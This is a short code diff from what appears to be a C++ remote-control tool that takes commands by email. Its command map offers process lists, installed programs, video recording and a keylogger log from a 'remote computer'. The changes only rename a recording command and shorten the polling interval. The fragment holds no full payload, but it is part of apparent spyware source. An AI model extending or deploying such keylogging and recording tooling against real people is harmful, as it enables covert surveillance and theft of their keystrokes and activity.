@@ -59,7 +59,7 @@ std::map<std::string, std::pair<std::string, std::string>> fileCommands = {
      {"Process list from remote computer", "processes_with_pid.txt"}},
     {"list_installed",
      {"Installed programs from remote computer", "installed_programs.txt"}},
-    {"get_recording",
+    {"start_recording",
      {"Video recording from remote computer", "recording.avi"}},
     {"keylogger", {"Keylogger log from remote computer", "keylog.txt"}}};
 
@@ -188,7 +188,7 @@ int main() {
                 << cmd << std::endl;
       process_command(cmd, senderEmail);
     }
-    std::this_thread::sleep_for(std::chrono::seconds(10));
+    std::this_thread::sleep_for(std::chrono::seconds(5));
   }
 
   curl_global_cleanup();
